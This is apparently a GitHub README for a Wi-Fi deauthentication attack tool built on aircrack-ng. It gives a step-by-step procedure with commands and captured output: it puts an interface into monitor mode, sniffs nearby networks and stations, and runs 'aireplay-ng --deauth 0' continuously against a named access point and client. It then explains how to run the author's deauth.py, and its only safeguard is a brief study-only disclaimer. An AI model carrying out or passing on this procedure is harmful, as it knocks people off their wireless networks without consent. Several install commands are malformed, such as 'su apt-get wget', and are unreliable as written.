[![GitHub issues](https://img.shields.io/github/issues/voltwu/WIFI-Deauthentication-Attack.svg)](https://github.com/voltwu/WIFI-Deauthentication-Attack/issues)
[![GitHub forks](https://img.shields.io/github/forks/voltwu/WIFI-Deauthentication-Attack.svg)](https://github.com/voltwu/WIFI-Deauthentication-Attack/network)
[![GitHub stars](https://img.shields.io/github/stars/voltwu/WIFI-Deauthentication-Attack.svg)](https://github.com/voltwu/WIFI-Deauthentication-Attack/stargazers)

# Introduction
Wifi deauthentication attack allows attackers to send frames from an access point to a station,even though the attack is not in the network.

Actually, send deauthentication frame is a normal functionality on all routers, almost all routers need to send special frames to inform rogue station to get out of network.

# Requirement
1. aircrack-ng
    ```
    su apt-get install aircrack-ng
    ```
    
2. ifconfig
    ```
    su apt-get install net-tools
    ```

3. iwconfig
    ```
    su sudo apt install wireless-tools
    ```

4. mac_address.csv

    the *mac_address.csv* contains OUI(Orgnazition Unique identifier)s and corresponds company names. first column is OUI and second column is Company.
    
    format:
    ```
    oui,company
    xx:xx:xx,xxx
    xx:xx:xx:x,xxx
    ```
    
    I downloaded *mac_address.csv* from [https://macaddress.io/database/macaddress.io-db.csv](https://macaddress.io/database/macaddress.io-db.csv), edit the file to only contain *oui* and *company* column,rename the file to *macaddress.csv*. then move the *macaddress.csv* file into the same directory as *deauth.py*.
    

# The Core Concept

This project completely builds on `aircrack-ng` package. below is core steps how to pose a deauthentication attack on the shell.

1. check the wireless interface name

    ```
    iwconfig
    ```
    **output:**
    ```
    eth0      no wireless extensions.
    wlan0     IEEE 802.11  ESSID:"Tenda_5A1D80"  
              Mode:Managed  Frequency:2.427 GHz  Access Point: B4:0F:3B:5A:1D:81   
              Bit Rate=135 Mb/s   Tx-Power=22 dBm   
              Retry short limit:7   RTS thr:off   Fragment thr:off
              Encryption key:off
              Power Management:on
              Link Quality=50/70  Signal level=-60 dBm  
              Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
              Tx excessive retries:0  Invalid misc:25   Missed beacon:0
    lo        no wireless extensions.
    ```

2. put wireless interface into monitor mode

    ```
    airmon-ng start wlan0
    ```
    **output:**
    ```
    Found 3 processes that could cause trouble.
    Kill them using 'airmon-ng check kill' before putting
    the card in monitor mode, they will interfere by changing channels
    and sometimes putting the interface back in managed mode
      PID Name
      501 NetworkManager
      598 wpa_supplicant
      643 dhclient
    PHY	Interface	Driver		Chipset
    phy0	wlan0		iwlwifi		Intel Corporation Wireless 3165 (rev 79)
    		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
	    	(mac80211 station mode vif disabled for [phy0]wlan0)
    ```

3. check the wireless interface name again

    Normally, the step2 will change the wireless interface's name. in the majority of cases, it will append `mon` on the previous name's end.
    ```
    iwconfig
    ```
    **output:**
    ```
    wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=0 dBm   
              Retry short limit:7   RTS thr:off   Fragment thr:off
              Power Management:on
    eth0      no wireless extensions.
    lo        no wireless extensions.
    ```

4. sniff data on traffics
    ```
    airodump-ng wlan0mon
    ```
    **output:**
    ```
    CH  4 ][ Elapsed: 0 s ][ 2019-12-27 07:47                                         
    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
    B4:0F:3B:5A:1D:81  -56        3        0    0   4  270  WPA2 CCMP   PSK  Tenda_5A1D80
    FC:7C:02:3E:9C:33  -79        3        0    0   3  130  WPA2 CCMP   PSK  ChinaNet-YhfA
    94:D9:B3:01:99:32  -79        1        0    0   1  270  WPA2 CCMP   PSK  TP-LINK_9932
    BSSID              STATION            PWR   Rate    Lost    Frames  Probe
    B4:0F:3B:5A:1D:81  88:78:73:D9:D4:BF  -34    0 - 6e     0        1
    94:D9:B3:01:99:32  1C:C3:EB:26:25:45  -81    0 - 1      0        2
    FC:7C:02:3E:9C:33  5C:CF:7F:33:56:78  -81    0 - 1      0        4
    ```


5. sniff data on specific network traffic

    ```
    airodump-ng -d B4:0F:3B:5A:1D:81 -c 4 wlan0mon
    ```
    **output:**
    ```
    CH  4 ][ Elapsed: 0 s ][ 2019-12-27 07:52                                         
    BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
    B4:0F:3B:5A:1D:81  -51   0       11      117    0   4  270  WPA2 CCMP   PSK  Tenda_5A1D80
    BSSID              STATION            PWR   Rate    Lost    Frames  Probe   
    B4:0F:3B:5A:1D:81  78:0F:77:89:FD:58   -1   54 - 0      0        2 
    B4:0F:3B:5A:1D:81  E0:37:BF:C7:11:F3  -70    0 -24e     0        3   
    B4:0F:3B:5A:1D:81  74:B5:87:DB:84:5F  -68    0e-36      0       20       
    B4:0F:3B:5A:1D:81  88:78:73:D9:D4:BF  -34    0 - 1e     0      109       
    ```

6. send deauthentication frames

    ```
    aireplay-ng --deauth 0 -a B4:0F:3B:5A:1D:81 -c 78:0F:77:89:FD:58 wlan0mon
    ```
    **output:**
    ```
    07:54:33  Waiting for beacon frame (BSSID: B4:0F:3B:5A:1D:81) on channel 4
    07:54:34  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|55 ACKs]
    07:54:34  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|59 ACKs]
    07:54:35  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|59 ACKs]
    07:54:35  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 1|53 ACKs]
    07:54:36  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|51 ACKs]
    07:54:37  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|56 ACKs]
    07:54:37  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|53 ACKs]
    07:54:38  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|53 ACKs]
    07:54:38  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 0|53 ACKs]
    07:54:39  Sending 64 directed DeAuth (code 7). STMAC: [78:0F:77:89:FD:58] [ 2|54 ACKs]
    ```

# How to use deauth.py
1. download deauth

    ```
    su apt-get wget https://codeload.github.com/voltwu/WIFI-Deauthentication-Attack/zip/master
    ```
2. unzip it
    ```
    unzip WIFI-Deauthentication-Attack-master.zip
    ```
    
3. run it with python3.x

    ```
    python3 deauth.py
    ```

# Disclaimer
Don't use this project to do any illegal things. it's only used for the study. responsibilities arising from the use of this project have nothing to do with the author.


